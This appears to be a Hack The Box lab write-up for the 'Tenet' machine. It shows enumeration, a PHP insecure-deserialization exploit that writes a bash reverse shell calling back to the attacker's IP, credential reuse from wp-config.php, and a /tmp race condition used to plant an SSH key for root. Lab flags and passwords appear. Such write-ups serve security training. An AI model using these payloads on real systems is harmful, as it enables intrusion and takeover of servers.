# Tenet

## Medium | 10.10.10.223
----
### nmap scan
```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~/Downloads/htbwriteups/unsolved]
└─$ sudo grc nmap 10.10.10.223                                                                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 13:33 EDT
Nmap scan report for tenet.htb (10.10.10.223)
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

### Details

Possible users:\
protagonist\
neil\


found comment by neil on migration\
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!


software named Rotas

WordPress 

We’re moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.



### enumeration
```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ gobuster dir -u http://tenet.htb/ -w /opt/SecLists/Discovery/Web-Content/big.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tenet.htb/
[+] Threads:        100
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/05/25 13:53:09 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/wp-content (Status: 301)
===============================================================
2021/05/25 13:54:02 Finished
===============================================================
```


http://tenet.htb/wp-admin
```
admin:admin not found
neil:admin 	Error: The password you entered for the username neil is incorrect. Lost your password?
protagonist:admin 	Error: The password you entered for the username protagonist is incorrect. Lost your password?
```

```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ curl http://10.10.10.223/sator.php
[+] Grabbing users from text file <br>
[] Database updated <br>                                                                                                                   
```

```
                                                                                                                   
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ curl http://10.10.10.223/sator.php.bak
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ curl http://10.10.10.223/users.txt    
Success                                                                                                                   
```



LEARN ABOUT OBJECT SERIALIZATION

link is looking for `arepo` variable\
code is then unserializing input without sanitizaiton.\
we can use this to execute php data for reverse shell!

```
class DatabaseExport{
    public $user_file = 'exploit.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.86/9876 0>&1\'"); ?>';
}

$output = urlencode(serialize(new DatabaseExport));
echo $output;

```
```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ php -a                                                                                                    130 ⨯
Interactive mode enabled

php > class DatabaseExport{
php {     public $user_file = 'exploit.php';
php {     public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.86/9876 0>&1\'")';
php { }
php > 
php > $output = urlencode(serialize(new DatabaseExport));
php > echo $output;
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A70%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%22%3B%7D
php > 
```


http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A70%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%22%3B%7D



http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D


```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ curl -X GET http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D && curl http://10.10.10.223/exploit.php
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>

```
```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ nc -lvnp 9876                                                                                               1 ⨯
listening on [any] 9876 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.10.223] 43700
bash: cannot set terminal process group (1550): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ 

```

python3 -c 'import pty; pty.spawn("/bin/bash")'


```
www-data@tenet:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

```


found in `/var/www/html/wordpress/wp-config.php`
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

`su neil`
`Opera2112`

cat user.txt
9b9367a66120496a55faf7e80eadeed2


```
neil@tenet:~$ sudo -l
sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 

```



```
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"
                if [[ -f $1 ]]; then /bin/rm $1; fi
                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded

```



        `tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)`
we have a race condition, want to overwrite the file between creation and adding

`ssh neil@10.10.10.223`
`password: Opera2112`

```
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHohH9PWcrvpbdLRj68LeY3AEqGSv0P4As/DK3HwuokgYZwtYMkRVnKiQBGTlmZCFswHFb0iSlfLZE4GZejewAycULP2TzMozlkjoJWBCKonTvMlwBoXEXf58jGm3zOmdKPRys6sfw/Uexx1nEpCSO5xNunKEbRK0lNX7gjYfiy7C5H4n7nUsmTgyRkJ6QajpuZqP/HxsHbnSLasdue4IwPmvMDfUgB/i6uLem+xR1KlBk6fiJb5yUmfOW14OgMaShYj44RV+5vS8Ec07ZeBbWgQ4t5dpclX7eMkXnWcXjyJHCu2ZMaE0lJ3VdUnsgSwP8oLn717q+gmsIlkUviv+FCIuA3xy8tXaY7Lsujd4SUppE7tRrVa8HcxdfhIs/xvXV4MaMZCl1CDFO5LDvxnd/j9F1AtAJwxBsN5Mpj6roELm31Hjm9sQVRBFw7LUkkHyLnPIIgVu6XXWjiA+6/eB9uo3odNZMZMar6IB3AWg7JU+3b67ELVNqid8uJPiCHH8= f0ur3y3s@f0ur3y3skali" | tee /tmp/ssh*; done


sudo /usr/local/bin/enableSSH.sh
```
```
root@tenet:~# cat root.txt
6c64e539c93415c980206a32256d32c5
```
```
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ ssh root@10.10.10.223 -i ~/.ssh/htb                
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
```

`hfxS53gy$YDGYBt.0P7G3TpKB0qo.gkUNClP2CRMHyCNU/2aVjQSPN3mxpL4hs7XYX1XNM5mSEGiASvizwxTV0DToS/wDV.`
### References
- https://gist.github.com/rshipp/eee36684db07d234c1cc
- https://www.w3schools.com/php/func_var_serialize.asp